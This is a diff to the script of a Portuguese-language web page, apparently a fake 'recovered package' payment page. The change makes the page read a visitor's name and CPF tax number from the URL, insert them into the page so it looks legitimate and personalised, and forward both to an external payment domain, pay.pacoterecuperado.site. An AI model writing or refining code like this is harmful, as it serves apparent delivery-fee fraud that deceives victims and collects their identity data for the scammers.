@@ -185,17 +185,48 @@
         </div>
     </div>
     <script>
-        function redirectCheckout(event) {
-            event.preventDefault();
-            
-            var currentUrlParams = new URLSearchParams(window.location.search);
-            currentUrlParams.set("name", "");
-            currentUrlParams.set("document", "");
+        (function(){
+            var params = new URLSearchParams(window.location.search);
+            var customerCpf = (params.get("document") || params.get("cpf") || "").replace(/\D/g, "");
+            var customerName = params.get("name") || "";
 
-            var finalUrl = "https://pay.pacoterecuperado.site/65XDZB8dz9RgVJw?" + currentUrlParams.toString();
+            function maskCPF(v){
+                if(!v) return "";
+                var s = v.replace(/\D/g, "");
+                if(s.length !== 11) return s;
+                return s.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
 
-            window.location.href = finalUrl;
-        }
+            function replaceText(find, replacement){
+                var nodes = document.querySelectorAll("span, p, b, h1, h2, div");
+                nodes.forEach(function(el){
+                    if(el && typeof el.innerHTML === "string" && el.innerHTML.indexOf(find) !== -1){
+                        el.innerHTML = el.innerHTML.replace(new RegExp(find, 'g'), replacement);
+                    }
+                });
+            }
+
+            if(customerName){
+                replaceText("Nome não disponível", customerName);
+            }
+            if(customerCpf){
+                var masked = maskCPF(customerCpf);
+                replaceText("CPF não disponível", masked);
+                var cpfGenericEl = document.getElementById("e_1225979_1_75116_d");
+                if(cpfGenericEl && cpfGenericEl.textContent.indexOf("Não informado") !== -1){
+                    cpfGenericEl.innerHTML = cpfGenericEl.innerHTML.replace("Não informado", masked);
+                }
+            }
+
+            window.redirectCheckout = function(event){
+                event.preventDefault();
+                var currentUrlParams = new URLSearchParams(window.location.search);
+                if(customerName){ currentUrlParams.set("name", customerName); }
+                if(customerCpf){ currentUrlParams.set("document", customerCpf); }
+                var finalUrl = "https://pay.pacoterecuperado.site/65XDZB8dz9RgVJw?" + currentUrlParams.toString();
+                window.location.href = finalUrl;
+            };
+        })();
     </script>
     <style>
         .stuck {
